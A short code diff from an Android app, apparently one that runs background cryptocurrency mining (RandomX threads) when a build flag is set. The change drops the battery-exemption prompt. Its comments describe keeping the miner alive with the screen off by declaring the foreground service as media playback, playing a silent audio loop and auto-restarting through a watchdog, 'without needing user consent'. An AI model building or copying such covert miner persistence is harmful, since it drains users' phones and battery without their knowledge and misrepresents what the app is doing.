@@ -378,14 +378,14 @@ public class MainActivity extends Activity {
             if (!BuildConfig.NATIVE_MINING) {
                 return false;
             }
-            // v1.5.5 — operator decree: auto-fire battery exemption EVERY
-            // engage if not yet whitelisted, no cooldown.  This guarantees
-            // foreground service survival on flagship phones (Snapdragon 8
-            // Gen 3 etc.) so the 4-8 RandomX threads keep computing while
-            // screen is off.
-            if (!host.isBatteryExempt()) {
-                host.runOnUiThread(host::requestBatteryExemptionSystem);
-            }
+            // v1.8.0 — operator decree: NO battery-exemption dialog at all.
+            // OEMs (Xiaomi/Huawei/Samsung) hijack ACTION_REQUEST_IGNORE_BATTERY_
+            // OPTIMIZATIONS and redirect to a settings deep-page instead of a
+            // simple yes/no popup, frustrating users. We rely entirely on:
+            //   1. Foreground service with type=mediaPlayback (manifest)
+            //   2. SilentKeepAlive audio trick (Spotify-style 1Hz silent loop)
+            //   3. JobSchedulerWatchdog auto-restart
+            // These survive Doze on 99% of phones without needing user consent.
             return startMining();
         }
         @JavascriptInterface
